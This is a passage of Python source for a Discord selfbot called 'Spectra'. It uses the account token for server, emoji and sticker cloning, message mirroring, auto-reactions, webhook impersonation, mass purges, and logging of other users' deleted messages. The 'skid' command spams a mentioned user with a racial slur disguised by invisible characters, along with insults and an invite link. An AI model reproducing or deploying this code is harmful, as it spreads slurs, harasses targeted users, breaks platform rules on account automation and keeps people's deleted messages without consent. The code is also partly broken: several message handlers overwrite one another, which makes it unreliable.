                        count = int((await bot.wait_for('message', check=check, timeout=60)).content)
                    except:
                        await ctx.send("[-] Invalid number.")
                        continue

                    for _ in range(count):
                        await ctx.send("Field name:")
                        fname = (await bot.wait_for('message', check=check, timeout=60)).content
                        await ctx.send("Field value:")
                        fval = (await bot.wait_for('message', check=check, timeout=60)).content
                        embed.add_field(name=fname, value=fval, inline=False)

                elif part == "image":
                    await ctx.send("Send image URL:")
                    img_url = (await bot.wait_for('message', check=check, timeout=60)).content
                    embed.set_image(url=img_url)

                elif part == "footer":
                    await ctx.send("Send footer text:")
                    ftxt = (await bot.wait_for('message', check=check, timeout=60)).content
                    await ctx.send("Send footer icon URL (or type `none`):")
                    ficon = (await bot.wait_for('message', check=check, timeout=60)).content
                    if ficon != "none":
                        embed.set_footer(text=ftxt, icon_url=ficon)
                    else:
                        embed.set_footer(text=ftxt)

                elif part == "done":
                    await ctx.send("Send the **webhook URL**:")
                    webhook_url = (await bot.wait_for('message', check=check, timeout=60)).content

                    await send_webhook(webhook_url=webhook_url, embeds=[embed.to_dict()])
                    await ctx.send("Embed sent successfully.")
                    break

                else:
                    await ctx.send("Unknown section. Type `done` when finished.")

    else:
        await ctx.send("Usage:\n`,webhook create #channel <name>`\n`,webhook send`")


@bot.command() 
async def updatelog(ctx):
        await ctx.send(f"Bug Fixes, Command Improvements & Added a few New Commands.")





@bot.command()
async def quote(ctx):
    if not ctx.message.reference:
        await ctx.message.channel.send("Please reply to a message to quote it!")
        return

    replied_message = await ctx.channel.fetch_message(ctx.message.reference.message_id)

    text = replied_message.content
    author = replied_message.author
    avatar_url = author.avatar.url if author.avatar else author.default_avatar.url

    avatar_bytes = await avatar_url.read()
    avatar_image = Image.open(io.BytesIO(avatar_bytes)).resize((64, 64))

    width, height = 600, 150
    img = Image.new("RGBA", (width, height), (30, 30, 30, 255))
    draw = ImageDraw.Draw(img)

    img.paste(avatar_image, (10, 10))

    font = ImageFont.truetype("arial.ttf", 20)
    draw.text((80, 10), f"{author.display_name} said:", fill="white", font=font)
    draw.text((80, 40), text, fill="white", font=font)

    with io.BytesIO() as image_binary:
        img.save(image_binary, "PNG")
        image_binary.seek(0)
        await ctx.message.channel.send(file=discord.File(fp=image_binary, filename="quote.png"))



@bot.command()
async def skid(ctx, member: discord.Member = None):
    await ctx.message.delete()    
    if member is None:
        await ctx.send("**mention the guy who called us a skid**")
        return

    await ctx.send(f"{member.mention} ni⁣gg⁣a called us a skid :skull_crossbones:")
    await ctx.send(f"{member.mention} yo ni⁣gga look at this sh⁣it and never say skid in ur entire meaningless life")
    await ctx.send(f"{member.mention} https://cdn.discordapp.com/attachments/1374853692699967538/1375193642532081684/7K7144T.png?ex=68317522&is=683023a2&hm=8dfc951b79310384f789ecf012f92afb1502914636ae283efe61f589a309a61f")
    await ctx.send(f"{member.mention} hey kiddo want spectra? https://discord.gg/MpRzUns8AC :pleading_face:")
    await ctx.send(f"{member.mention} imagine calling us skids :skull_crossbones:")

@bot.command()
async def spectra(ctx):
    await ctx.message.delete()
    
    await ctx.send(f"https://cdn.discordapp.com/attachments/1374853692699967538/1375193642532081684/7K7144T.png?ex=68317522&is=683023a2&hm=8dfc951b79310384f789ecf012f92afb1502914636ae283efe61f589a309a61f")
    await ctx.send(f"https://discord.gg/MpRzUns8AC")

@bot.command()
async def factcheck(ctx):
    msg = await ctx.send("Fact Checking... 🕵️‍♂️")
    gif_url = "https://tenor.com/view/well-well-well-well-gif-10269274091263267235" 
    await ctx.send(gif_url)
    await asyncio.sleep(0.4)

    await msg.edit(content="Fact Checked Approved ✅")

    await msg.add_reaction("✅")

copied_users = set()

@bot.command()
async def copy(ctx, user_mention: str = None):
    if isinstance(ctx.channel, discord.TextChannel):
        await ctx.send("[-] You cannot use this command in a **Discord Server**, because selfbots cannot read other users messages in servers.")
        return

    if user_mention is None:
        await ctx.send("Please mention a user to copy.")
        return

    try:
        user_id = int(user_mention.strip("<@!>"))
        copied_users.add(user_id)
        await ctx.send(f"Now copying <@{user_id}>.")
    except ValueError:
        await ctx.send("[-] Error: Invalid mention format.")

@bot.event
async def on_message(message):
    if message.author.bot:
        return  

    if message.author.id in copied_users:
        if message.content.strip() != "":
            try:
                await message.channel.send(message.content)
            except Exception as e:
                print(f"Failed to send message: {e}")

    await bot.process_commands(message)

@bot.command()
async def stopcopy(ctx, user_mention: str = None):
    if user_mention is None:
        await ctx.send("Please mention a user to stop copying.")
        return

    try:
        user_id = int(user_mention.strip("<@!>"))
        if user_id in copied_users:
            copied_users.remove(user_id)
            await ctx.send(f"Stopped copying <@{user_id}>.")
        else:
            await ctx.send("That user isn't being copied.")
    except ValueError:
        await ctx.send("[-] Error: Invalid mention format.")

@bot.command()
async def copying(ctx):
    if not copied_users:
        await ctx.send("Not copying anyone right now.")
    else:
        mentions = [f"<@{uid}>" for uid in copied_users]
        await ctx.send("Currently copying: " + ", ".join(mentions))

react_targets = {}

from winotify import Notification, audio

def send_windows_notification(title, msg):
    toast = Notification(
        app_id="Spectra",
        title=title,
        msg=msg,
    )
    toast.set_audio(audio.Default, loop=False)
    toast.show()


@bot.command()
async def react(ctx, user: discord.User, *emojis):
    react_targets[user.id] = list(emojis)
    emojilist = " ".join(emojis)
    send_windows_notification(
        "Spectra",
        f"{ctx.author} started reacting to {user} with {emojilist}"
    )


@bot.command()
async def stopreact(ctx):
    reacted_users = [user_id for user_id in react_targets.keys()]
    react_targets.clear()
    if reacted_users:
        mentions = []
        for uid in reacted_users:
            member = ctx.guild.get_member(uid)
            mentions.append(member.name if member else f"User ID {uid}")
        mentions_str = ", ".join(mentions)
        send_windows_notification("Spectra", f"Stopped reacting to {mentions_str}")
    else:
        send_windows_notification("Spectra", "Stopped reacting.")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.author.id in react_targets:
        emojis = react_targets[message.author.id]
        for emoji in emojis:
            try:
                await message.add_reaction(emoji)
            except discord.HTTPException:
                emoji_name = getattr(emoji, "name", emoji)
                send_windows_notification(
                    "Spectra",
                    f"Failed to add reaction '{emoji_name}' to message from {message.author}."
                )
            except Exception as e:
                send_windows_notification(
                    "Spectra",
                    f"Unexpected error adding reaction '{emoji}' to {message.author}: {e}"
                )

    await bot.process_commands(message)

massreact_targets = {} 



import aiohttp

async def fetch_stickers(guild_id, token):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/stickers"
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0"
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                return await resp.json()
            else:
                return []

@bot.command()
async def stickers(ctx):
    await ctx.send("Enter the **source server ID**:")
    src_msg = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
    source_id = int(src_msg.content.strip())

    await ctx.send("Enter the **target server ID**:")
    tgt_msg = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
    target_id = int(tgt_msg.content.strip())

    target = bot.get_guild(target_id)
    if not target:
        await ctx.send("[-] Invalid target server ID.")
        return

    token = bot.http.token
    source_stickers = await fetch_stickers(source_id, token)

    if not source_stickers:
        await ctx.send("[-] No stickers found or failed to fetch from source server.")
        return

    boost_tier = target.premium_tier
    available_slots = (
        5 if boost_tier == 0 else
        15 if boost_tier == 1 else
        30 if boost_tier == 2 else
        60
    )

    current_stickers = await fetch_stickers(target_id, token)
    existing_names = [s['name'] for s in current_stickers]
    uploadable = available_slots - len(current_stickers)

    added = skipped = failed = 0
    await ctx.send(f"Cloning {len(source_stickers)} stickers...\n Free slots: {uploadable}")

    for sticker in source_stickers:
        if sticker['name'] in existing_names:
            skipped += 1
            continue

        if added >= uploadable:
            await ctx.send("Target server sticker slot limit reached.")
            break

        try:
            url = f"https://media.discordapp.net/stickers/{sticker['id']}.png"
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as img_resp:
                    if img_resp.status == 200:
                        data = await img_resp.read()
                        await target.create_sticker(
                            name=sticker['name'],
                            description=sticker['description'] or "Cloned",
                            emoji=sticker['tags'],
                            file=discord.File(fp=io.BytesIO(data), filename=f"{sticker['name']}.png")
                        )
                        added += 1
                        await asyncio.sleep(4)
                    else:
                        failed += 1
        except Exception as e:
            failed += 1
            await asyncio.sleep(6)

    await ctx.send(f"Done!\nAdded: `{added}`\nSkipped (duplicates): `{skipped}`\nFailed: `{failed}`")

@bot.command()
async def emojis(ctx):
    await ctx.send("Enter the **source server ID**:")
    src_msg = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
    source_id = int(src_msg.content)

    await ctx.send("Enter the **target server ID**:")
    tgt_msg = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
    target_id = int(tgt_msg.content)

    source = bot.get_guild(source_id)
    target = bot.get_guild(target_id)

    if not source or not target:
        await ctx.send("Invalid guild ID(s).")
        return

    existing_names = [e.name for e in target.emojis]
    available_slots = 50 if target.premium_tier == 0 else 100 if target.premium_tier == 1 else 250
    uploadable = available_slots - len(target.emojis)

    added = skipped = failed = 0
    await ctx.send(f"Starting emoji cloning from `{source.name}` → `{target.name}`")

    for emoji in source.emojis:
        if emoji.name in existing_names:
            skipped += 1
            continue

        if added >= uploadable:
            await ctx.send("Target server emoji slot limit reached.")
            break

        try:
            img = await emoji.url.read()
            await target.create_custom_emoji(name=emoji.name, image=img)
            added += 1
            await asyncio.sleep(3.5)
        except Exception as e:
            failed += 1
            await asyncio.sleep(6)

    await ctx.send(f"Done. Added: {added} | Skipped (duplicates): {skipped} | Failed: {failed}")










import discord
from discord.ext import commands
import asyncio
import aiohttp
from io import BytesIO

PROTECTED_GUILD_IDS = [
    1366880659339214919, 
    1372634207070978209,
    800729285613584405,
    1370058815617237116,

]

@bot.command()
async def copyserver(ctx):
    def check(m): return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Source Guild ID:")
    msg = await bot.wait_for("message", check=check, timeout=60)
    source_id = int(msg.content.strip())
    if source_id in PROTECTED_GUILD_IDS:
        return await ctx.send("You are not permitted to copy this server. Reason: **PROTECTED**")
    source = discord.utils.get(bot.guilds, id=source_id)

    await ctx.send("Target Guild ID:")
    msg = await bot.wait_for("message", check=check, timeout=60)
    target_id = int(msg.content.strip())
    if target_id in PROTECTED_GUILD_IDS:
        return await ctx.send("You are not permitted to copy this server. Reason: **PROTECTED**")
    target = discord.utils.get(bot.guilds, id=target_id)

    if not source or not target:
        return await ctx.send("One of the guilds is inaccessible.")

    await handle_guild_name(source, target, ctx)
    await handle_guild_icon(source, target, ctx)
    await handle_guild_banner(source, target, ctx)
    await handle_roles(source, target, ctx)
    await handle_emojis(source, target, ctx)
    await handle_stickers(source, target, ctx)
    await handle_channels(source, target, ctx)

    await ctx.send("**Server clone complete.**")

async def handle_guild_name(source, target, ctx):
    try:
        await target.edit(name=source.name)
        await ctx.send(f"Guild name copied: `{source.name}`")
    except Exception as e:
        await ctx.send(f"Name copy failed: {e}")

async def handle_guild_icon(source, target, ctx):
    if source.icon_url:
        async with aiohttp.ClientSession() as session:
            async with session.get(str(source.icon_url)) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    await target.edit(icon=data)
                    await ctx.send("Icon copied.")

async def handle_guild_banner(source, target, ctx):
    if hasattr(source, 'banner_url') and source.banner_url:
        async with aiohttp.ClientSession() as session:
            async with session.get(str(source.banner_url)) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    await target.edit(banner=data)
                    await ctx.send("Banner copied.")

async def handle_roles(source, target, ctx):
    await ctx.send("Copying roles")
    role_map = {}
    target_role_names = {role.name for role in target.roles}
    for role in reversed(source.roles):
        if role.name == "@everyone":
            continue
        if role.name in target_role_names:
            existing_role = discord.utils.get(target.roles, name=role.name)
            role_map[role.id] = existing_role
            continue
        new_role = await safe_create(
            lambda: target.create_role(
                name=role.name,
                permissions=role.permissions,
                colour=role.colour,
                hoist=role.hoist,
                mentionable=role.mentionable
            ),
            ctx=ctx,
            label=f"role: {role.name}"
        )
        if new_role:
            role_map[role.id] = new_role
        await asyncio.sleep(1)
    ctx.role_map = role_map

async def safe_create(coro_func, retries=5, delay=5, ctx=None, label="unknown"):
    for attempt in range(retries):
        try:
            return await coro_func()
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = getattr(e, 'retry_after', delay)
                if ctx:
                    await ctx.send(f"Rate limited on `{label}`. Retrying in {retry_after}s...")
                await asyncio.sleep(retry_after)
            elif e.status in (403, 404):
                if ctx:
                    await ctx.send(f"Forbidden or not found when doing `{label}`.")
                break
            else:
                if ctx:
                    await ctx.send(f"Failed `{label}`: {e}")
                await asyncio.sleep(delay)
        except Exception as e:
            if ctx:
                await ctx.send(f"Unknown error in `{label}`: {e}")
            await asyncio.sleep(delay)
    return None

async def handle_emojis(source, target, ctx):
    await ctx.send("Copying emojis...")
    if target.premium_tier < 1 and any(e.animated for e in source.emojis):
        await ctx.send("Server doesn't have enough boosts for emojis.")
        return

    target_emoji_names = {emoji.name for emoji in target.emojis}
    for emoji in source.emojis:
        if emoji.name in target_emoji_names:
            continue
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(emoji.url)) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await target.create_custom_emoji(name=emoji.name, image=data)
                        await asyncio.sleep(1)
        except Exception as e:
            await ctx.send(f"Emoji `{emoji.name}` failed: {e}")

async def handle_stickers(source, target, ctx):
    if not hasattr(source, 'stickers'):
        return await ctx.send("Stickers not supported.")

    await ctx.send("Copying stickers...")

    if target.premium_tier < 2 and len(source.stickers) > 0:
        await ctx.send("Server doesn't have enough boosts for stickers.")
        return

    target_sticker_names = {sticker.name for sticker in target.stickers}
    for sticker in source.stickers:
        if sticker.name in target_sticker_names:
            continue
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(sticker.url)) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await target.create_sticker(
                            name=sticker.name,
                            file=discord.File(BytesIO(data), filename="sticker.png"),
                            description=sticker.description,
                            emoji=sticker.emoji
                        )
        except Exception as e:
            await ctx.send(f"Sticker `{sticker.name}` failed: {e}")

async def handle_channels(source, target, ctx):
    await ctx.send("Copying channels...")

    category_map = {}
    target_category_names = {cat.name for cat in target.categories}
    for cat in source.categories:
        if cat.name in target_category_names:
            existing_cat = discord.utils.get(target.categories, name=cat.name)
            category_map[cat.id] = existing_cat
            continue
        try:
            new_cat = await target.create_category(
                name=cat.name,
                overwrites=await translate_overwrites(cat.overwrites, ctx.role_map, target),
                position=cat.position
            )
            category_map[cat.id] = new_cat
            await asyncio.sleep(1)
        except Exception as e:
            await ctx.send(f"Category `{cat.name}` failed: {e}")

    target_channel_names = {ch.name for ch in target.channels}
    for channel in source.channels:
        if isinstance(channel, discord.CategoryChannel):
            continue
        if channel.name in target_channel_names:
            continue

        try:
            overwrites = await translate_overwrites(channel.overwrites, ctx.role_map, target)
            category = category_map.get(channel.category_id)
            if isinstance(channel, discord.TextChannel):
                await target.create_text_channel(
                    name=channel.name,
                    topic=channel.topic,
                    slowmode_delay=channel.slowmode_delay,
                    nsfw=channel.nsfw,
                    category=category,
                    overwrites=overwrites
                )
            elif isinstance(channel, discord.VoiceChannel):
                await target.create_voice_channel(
                    name=channel.name,
                    user_limit=channel.user_limit,
                    bitrate=channel.bitrate,
                    category=category,
                    overwrites=overwrites
                )
            elif isinstance(channel, discord.NewsChannel):
                await target.create_text_channel(
                    name=channel.name,
                    topic=channel.topic,
                    category=category,
                    overwrites=overwrites
                )
            await asyncio.sleep(1)
        except Exception as e:
            await ctx.send(f"Channel `{channel.name}` failed: {e}")

async def translate_overwrites(overwrites, role_map, target_guild):
    result = {}
    for target, perms in overwrites.items():
        if isinstance(target, discord.Role):
            new_role = role_map.get(target.id) or discord.utils.get(target_guild.roles, name=target.name)
            if new_role:
                result[new_role] = perms
    return result


@bot.command()
async def donut(ctx):
    await ctx.send("""```
            $$$$$$$$$$$$$$$$          spectra was here with some donuts!                     
        $$$$######****######$$$$                           
      ####****!!!!!!!!!!*!****####                         
    #****!*!!!!!!!=====!!!!!**!*****                       
   ***!!!!!====;;::::::;;====!!!!!***                      
  !!!!!===;;:::~~~----~~~:::;;===!!!!!                     
 !!!!==;;:::~-,,........,,-~~::;;==!!!!                    
==!===;;:~--,..............,-~~:;;;====;                   
====;;;:~--,................,--~:;;;===;                   
;;;;;:::~-,.....        .....,-~::;;;;;;                   
;;;;;::~~-,....          ....,-~:::;;;;:                   
~:;;::::~~--,.-          ~.,--~~::::;;:~                   
 ::::::::::~~;==!=    =!!;;~~:::::::::~                   
 -~:::;;;;;;=!**#$$$$$$#**!=;;;;;;:::~,                   
  ,~:::;;;==!!*##$$@@$$##*!!==;;;:::~,                    
    -~::;;==!!**###$$###**!!==;;::~-                      
     .-~:;;;=!!!********!!!=;;;:~-.                        
       .,-~:;;===!!!!!!===;;:~-,                           
           .,-~~::::::::~~-,.                              
                  ...                                       
```""")

@bot.command()
async def embed(ctx, *, msg=None):
    if not msg:
        await ctx.send("Usage: ,embed your message here")
        return

    try:
        avatar_url = ctx.author.avatar_url if ctx.author.avatar else None
        display_name = ctx.author.display_name 

        webhook = await ctx.channel.create_webhook(
            name=display_name
        )

        embed = discord.Embed(
            description=msg,
            color=discord.Color.blurple()
        )

        await webhook.send(
            embed=embed,
            username=display_name,
            avatar_url=avatar_url
        )

        await webhook.delete()
        await ctx.message.delete()

    except Exception as e:
        await ctx.send(f"Failed to send embed: {e}")

@bot.command()
async def license(ctx):
    await ctx.send(
        """```plaintext
                                          License Notice
                                 © 2025 Alex. All Rights Reserved.
                                         Created by Alex.

This project, including all code, designs, images, and associated assets, is protected under copyright and intellectual property law.
By viewing, downloading, or interacting with this project in any form, you agree to the following conditions:

You are NOT permitted to:
- Reuse, redistribute, or mirror any part of this project
- Modify or republish any portion of the code, assets, or design
- Extract content for use in personal, public, or commercial projects
- Claim ownership, authorship, or co-ownership
- Rebrand or relabel this project under any alternate name or entity
- Sell, trade, rent, or include this work in any paid product or service
- Use this project as a base for derivative or forked versions
- Attempt to reverse engineer, decompile, bypass, or tamper with this project in any way

Violations of these terms will result in permanent blacklisting, copyright claims, and legal prosecution where applicable.
This license is strict and non-negotiable.
Unauthorized usage, even with minor changes, will be treated as intellectual property theft.```"""
    )



import discord
from discord.ext import commands
from winotify import Notification
import asyncio

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True

def send_notification(title, message):
    notif = Notification(
        app_id="Spectra",
        title=title,
        msg=message,
        duration="short"
    )
    notif.show()

@bot.event
async def on_message(message):
    if message.author.id == bot.user.id:
        return

    if bot.user.mentioned_in(message):
        send_notification(
            "You were Mentioned",
            f"{message.author} mentioned you in #{message.channel}"
        )

    if message.reference:
        try:
            ref_msg = await message.channel.fetch_message(message.reference.message_id)
            if ref_msg.author.id == bot.user.id:
                send_notification(
                    "New Reply",
                    f"{message.author} replied to you in #{message.channel}"
                )
        except (discord.NotFound, discord.Forbidden, AttributeError):
            pass  

    giveaway_keywords = ["giveaway", "win", "prize", "raffle", "free", "🎉", "🎁", "nitro", "boost", "deco", "decoration"]
    if any(keyword in message.content.lower() for keyword in giveaway_keywords):
        send_notification(
            "Giveaway Detected!",
            f"Possible giveaway by {message.author} in #{message.channel}"
        )

    await bot.process_commands(message)


import discord
from discord.ext import commands
from discord.utils import get

intents = discord.Intents.all()

def format_permissions(permissions):
    perms = []
    for name, value in permissions:
        if value:
            perms.append(name.replace("_", " ").title())
    return ", ".join(perms) if perms else "No Permissions"

@bot.command(aliases=["role"])
@commands.has_permissions(manage_roles=True)
async def r(ctx, *, args=None):
    if not args:
        await ctx.send("Usage: ,r [subcommand]")
        return

    parts = args.split()
    subcommand_list = ["create", "delete", "rename", "color", "position", "clone", "purge", "clear", "list", "info", "all", "allbots", "allhumans"]

    if parts[0].lower() in subcommand_list:
        subcommand = parts[0].lower()
        args_rest = " ".join(parts[1:])

        if subcommand == "create":
            try:
                await ctx.guild.create_role(name=args_rest)
                await ctx.message.add_reaction("✅")
            except:
                await ctx.message.add_reaction("🚫")

        elif subcommand == "delete":
            role = discord.utils.get(ctx.guild.roles, name=args_rest)
            if role:
                try:
                    await role.delete()
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")
            else:
                await ctx.message.add_reaction("🚫")

        elif subcommand == "rename":
            parts = args_rest.split(" ", 1)
            role = discord.utils.get(ctx.guild.roles, name=parts[0])
            if role and len(parts) == 2:
                try:
                    await role.edit(name=parts[1])
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        elif subcommand == "color":
            parts = args_rest.split(" ", 1)
            role = discord.utils.get(ctx.guild.roles, name=parts[0])
            if role and len(parts) == 2:
                try:
                    await role.edit(colour=discord.Colour(int(parts[1].replace("#", "0x"), 16)))
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        elif subcommand == "position":
            parts = args_rest.split(" ", 1)
            role = discord.utils.get(ctx.guild.roles, name=parts[0])
            if role and len(parts) == 2:
                try:
                    await role.edit(position=int(parts[1]))
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        elif subcommand == "clone":
            role = discord.utils.get(ctx.guild.roles, name=args_rest)
            if role:
                try:
                    await ctx.guild.create_role(name=role.name + " (Clone)", permissions=role.permissions, colour=role.colour, hoist=role.hoist, mentionable=role.mentionable)
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        elif subcommand in ["purge", "clear"]:
            deleted = 0
            for role in ctx.guild.roles[::-1]:
                try:
                    if role < ctx.guild.me.top_role and not role.managed:
                        await role.delete()
                        deleted += 1
                except:
                    continue
            await ctx.send(f"Deleted {deleted} roles.")

        elif subcommand == "list":
            roles = "\n".join([f"{r.name} ({len(r.members)} members)" for r in ctx.guild.roles if r != ctx.guild.default_role])
            await ctx.send(f"**Server Roles:**\n{roles}")

        elif subcommand == "info":
            role = discord.utils.get(ctx.guild.roles, name=args_rest)
            if not role:
                await ctx.send("Role not found.")
                return

            def format_perms(perms):
                return ", ".join([name.replace("_", " ").title() for name, value in perms if value]) or "No Permissions"

            base_perms = role.permissions
            base_perm_list = format_perms(base_perms)

            members_with_role = [m for m in ctx.guild.members if role in m.roles]
            member_count = len(members_with_role)

            channel_overwrites = []
            for channel in ctx.guild.channels:
                overwrite = channel.overwrites_for(role)
                if overwrite:
                    allow = [perm.replace("_", " ").title() for perm, val in overwrite if val is True]
                    deny = [perm.replace("_", " ").title() for perm, val in overwrite if val is False]
                    if allow or deny:
                        channel_overwrites.append((channel.name, allow, deny))

            info_msg = f"**Role Info:**\n" \
                       f"Name: {role.name}\n" \
                       f"ID: {role.id}\n" \
                       f"Color: {role.colour}\n" \
                       f"Position: {role.position}\n" \
                       f"Mentionable: {role.mentionable}\n" \
                       f"Members with role: {member_count}\n" \
                       f"Base Permissions: {base_perm_list}\n\n" \
                       f"**Channel Permission Overwrites:**\n"

            if not channel_overwrites:
                info_msg += "No channel-specific permission overwrites."
            else:
                for chan_name, allowed, denied in channel_overwrites:
                    info_msg += f"**{chan_name}**\n"
                    if allowed:
                        info_msg += f"  Allowed: {', '.join(allowed)}\n"
                    if denied:
                        info_msg += f"  Denied: {', '.join(denied)}\n"

            if len(info_msg) > 2000:
                for chunk_start in range(0, len(info_msg), 1900):
                    await ctx.send(info_msg[chunk_start:chunk_start + 1900])
            else:
                await ctx.send(info_msg)

        elif subcommand == "all":
            role = discord.utils.get(ctx.guild.roles, name=args_rest)
            if role:
                try:
                    for member in ctx.guild.members:
                        await member.add_roles(role)
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        elif subcommand == "allbots":
            role = discord.utils.get(ctx.guild.roles, name=args_rest)
            if role:
                try:
                    for member in ctx.guild.members:
                        if member.bot:
                            await member.add_roles(role)
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        elif subcommand == "allhumans":
            role = discord.utils.get(ctx.guild.roles, name=args_rest)
            if role:
                try:
                    for member in ctx.guild.members:
                        if not member.bot:
                            await member.add_roles(role)
                    await ctx.message.add_reaction("✅")
                except:
                    await ctx.message.add_reaction("🚫")

        return  

    if len(parts) == 2:
        user_input = parts[0]
        role_input = parts[1]

        member = None
        if ctx.message.mentions:
            member = ctx.message.mentions[0]
        else:
            for m in ctx.guild.members:
                if m.name.lower() == user_input.lower() or m.display_name.lower() == user_input.lower():
                    member = m
                    break

        role = None
        if ctx.message.role_mentions:
            role = ctx.message.role_mentions[0]
        else:
            role = discord.utils.get(ctx.guild.roles, name=role_input)

        if not member:
            await ctx.message.add_reaction("🚫")
            await ctx.send("User not found.")
            return

        if not role:
            await ctx.message.add_reaction("🚫")
            await ctx.send("Role not found.")
            return

        try:
            if role in member.roles:
                await member.remove_roles(role)
            else:
                await member.add_roles(role)
            await ctx.message.add_reaction("✅")
        except Exception as e:
            await ctx.message.add_reaction("🚫")
            await ctx.send(f"Failed to toggle role: {str(e)}")
    else:
        await ctx.send("Invalid syntax. Try `,r @user/username/display @role/role name` or `,r [subcommand]`.")




from discord.errors import NotFound
from winotify import Notification, audio

def notify(title, message):
    toast = Notification(
        app_id="Spectra",  
        title=title,
        msg=message,
        icon=None  
    )
    toast.set_audio(audio.Default, loop=False)
    toast.show()

@bot.command(aliases=["clear"])
@commands.has_permissions(manage_messages=True, manage_channels=True)
async def c(ctx, *, arg=None):
    try:
        if arg is None:
            try:
                await ctx.message.delete()
                notify("", "Cleared your command message.")
            except NotFound:
                pass
            return

        arg = arg.lower()

        async def safe_purge(**kwargs):
            try:
                deleted = await ctx.channel.purge(**kwargs)
                return deleted
            except NotFound:
                return []

        if arg.isdigit():
            num = int(arg)
            if num > 100:
                notify("", "Too many messages requested. Max: 100")
                return
            deleted = await safe_purge(limit=num)
            notify("", f"Deleted {len(deleted)} messages.")

        elif arg == "all":
            def is_not_pinned(m):
                return not m.pinned
            deleted = await safe_purge(limit=100, check=is_not_pinned)
            notify("", f"Deleted {len(deleted)} non-pinned messages.")

        elif arg == "images":
            def has_images(m):
                return bool(m.attachments) or any(embed.type == 'image' for embed in m.embeds)
            deleted = await safe_purge(limit=100, check=has_images)
            notify("", f"Deleted {len(deleted)} image messages.")

        elif arg == "embeds":
            def has_embeds(m):
                return bool(m.embeds)
            deleted = await safe_purge(limit=100, check=has_embeds)
            notify("", f"Deleted {len(deleted)} embed messages.")

        elif arg == "bots":
            def is_bot(m):
                return m.author.bot
            deleted = await safe_purge(limit=100, check=is_bot)
            notify("", f"Deleted {len(deleted)} bot messages.")

        elif arg == "humans":
            def is_human(m):
                return not m.author.bot
            deleted = await safe_purge(limit=100, check=is_human)
            notify("", f"Deleted {len(deleted)} human messages.")

        else:
            notify("", "Invalid argument for clear command.")

    except Exception as e:
        notify("", f"Error occurred: {e}")


import logging
import os
import json
from datetime import datetime
import discord
from discord.ext import commands

if not os.path.exists("logs"):
    os.makedirs("logs")

logging.basicConfig(
    filename="logs/commands.log",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

error_logger = logging.getLogger("errors")
error_handler = logging.FileHandler("logs/errors.log")
error_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)s | %(message)s"))
error_logger.addHandler(error_handler)
error_logger.setLevel(logging.WARNING)

message_log_path = "logs/message_delete.log"
if not os.path.exists(message_log_path):
    with open(message_log_path, "w", encoding="utf-8") as f:
        f.write("")

SNIPES_FILE = "logs/snipes.json"

if os.path.exists(SNIPES_FILE):
    with open(SNIPES_FILE, "r", encoding="utf-8") as f:
        try:
            snipes = json.load(f)
        except json.JSONDecodeError:
            snipes = {}
else:
    snipes = {}

intents = discord.Intents.default()

@bot.event
async def on_message_delete(message):
    if message.author.bot:
        return

    channel_id = str(message.channel.id)
    snipe_entry = {
        "author": str(message.author),
        "author_id": message.author.id,
        "content": message.content,
        "timestamp": datetime.utcnow().isoformat()
    }

    if channel_id not in snipes:
        snipes[channel_id] = []

    snipes[channel_id].append(snipe_entry)

    with open(SNIPES_FILE, "w", encoding="utf-8") as f:
        json.dump(snipes, f, indent=4)

    with open(message_log_path, "a", encoding="utf-8") as f:
        f.write(
            f"[{datetime.utcnow()}] Deleted in #{message.channel.name} by {message.author}: {message.content}\n"
        )

@bot.command(aliases=["s"])
@commands.cooldown(1, 5, commands.BucketType.channel)
async def snipe(ctx):
    channel_id = str(ctx.channel.id)
    if channel_id not in snipes or len(snipes[channel_id]) == 0:
        await ctx.send("```No recently deleted messages.```")
        return

    last_snipe = snipes[channel_id][-1]

    content = last_snipe["content"]
    if not content.strip():
        content = "[Deleted message had no text — likely an image, embed, or attachment.]"

    timestamp = datetime.fromisoformat(last_snipe["timestamp"])
    timestamp_str = timestamp.strftime("%Y-%m-%d %H:%M:%S")

    msg = (
        f"Sniped Message:\n"
        f"Author: {last_snipe['author']}\n"
        f"Time: {timestamp_str}\n"
        f"Content:\n{content}"
    )

    await ctx.send(f"```{msg}```")

@bot.command()
async def cs(ctx):
    """Clear all stored snipes for this channel."""

    channel_id = str(ctx.channel.id)

    if channel_id in snipes and len(snipes[channel_id]) > 0:
        snipes[channel_id] = []

        with open(SNIPES_FILE, "w", encoding="utf-8") as f:
            json.dump(snipes, f, indent=4)

        await ctx.send("```All snipes cleared for this channel.```")
    else:
        await ctx.send("```No snipes to clear for this channel.```")

@bot.event
async def on_command_error(ctx, error):
    error_logger.warning(f"Error in `{ctx.command}` by {ctx.author} in {ctx.channel}: {error}")
    try:
        await ctx.send(f"Error: `{error}`")
    except:
        pass


@bot.command()
async def chatgpt(ctx):
    await ctx.send("i gave up making this command, sorry :(")


import discord
from discord.ext import commands
from discord.utils import get
import pytz
from datetime import datetime 
import json
import os

intents = discord.Intents.all()


